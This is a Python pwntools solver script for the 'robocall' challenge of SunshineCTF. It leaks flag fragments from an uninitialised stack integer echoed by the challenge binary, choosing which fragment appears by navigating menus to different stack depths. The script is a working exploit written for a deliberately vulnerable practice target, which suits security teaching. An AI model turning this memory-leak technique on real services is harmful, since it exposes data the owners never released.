#!/usr/bin/env python3
# robocall (SunshineCTF) solver  -- robust version.
#
# Bug: cancel_plan() prints an UNINITIALISED int ("You've entered X") when both of
# its menu reads fail to parse as integers. That int is stale stack memory = one
# 4-byte flag chunk that place_flag() scattered across the stack. Which chunk you
# read depends on the call-stack depth, steered by menu "bounces" done first:
#   's' = scream        (start_position opt 3)  -> deeper
#   'r' = report_outage (call -> opt 2)         -> deeper
#   'c' = cancel press-1 bounce                 -> deeper
# Each recipe below deterministically leaks one chunk index.
#
# This version sends the whole keystroke sequence up-front and just greps the
# echoed number out of the output, so it is robust to prompt wording / latency.
#
# Usage:  python3 solve.py                         # local ./robocall
#         python3 solve.py sunshinectf.games 26199 # remote
import sys, re
from pwn import *
context.log_level = 'error'

HOST = sys.argv[1] if len(sys.argv) >= 3 else None
PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else None

def build(recipe):
    """Return the full stdin byte-stream for a recipe + final descend/leak."""
    o = ['42']                                   # disable the "be_annoying" sleeps
    for ch in recipe:
        if ch == 's':   o += ['3', '5']                       # scream bounce
        elif ch == 'r': o += ['1', '2', 'addr']               # report_outage bounce
        elif ch == 'c': o += ['1', '6', '2', 'z', 'z', 'z', '1']  # cancel press-1 bounce
    # final descent to cancel_plan + trigger the uninitialised echo
    o += ['1', '6', '2', 'z', 'z', 'z', 'x', 'x']
    return ('\n'.join(o) + '\n').encode()

def spawn():
    return remote(HOST, PORT, timeout=30) if HOST else process('./robocall', timeout=30)

def leak(recipe):
    io = spawn()
    io.send(build(recipe))
    data = b''
    try:
        # read until the echo shows up (or timeout)
        data = io.recvuntil(b'You\'ve entered "', timeout=30)
        num = io.recvuntil(b'"', drop=True, timeout=30)
        v = int(num)
    except Exception:
        io.close()
        raise
    io.close()
    return (v & 0xffffffff).to_bytes(4, 'little')

RECIPE = {0:'r', 1:'ssss', 2:'sr', 4:'sssss', 5:'ssr',
          7:'ssssss', 8:'sssr', 10:'sssssss', 11:'rr', 12:'c'}

chunks = {}
for idx, rec in sorted(RECIPE.items()):
    got = b'????'
    for attempt in range(3):                     # retry a couple of times
        try:
            got = leak(rec); break
        except Exception as e:
            err = e
    chunks[idx] = got
    print("chunk %2d  recipe=%-8s -> %r" % (idx, rec, got), flush=True)

out = b''.join(chunks.get(i, b'????') for i in range(13))
print("\nflag (?? = chunks 3/6/9):", out.split(b'\x00')[0].decode('latin1', 'replace'), flush=True)
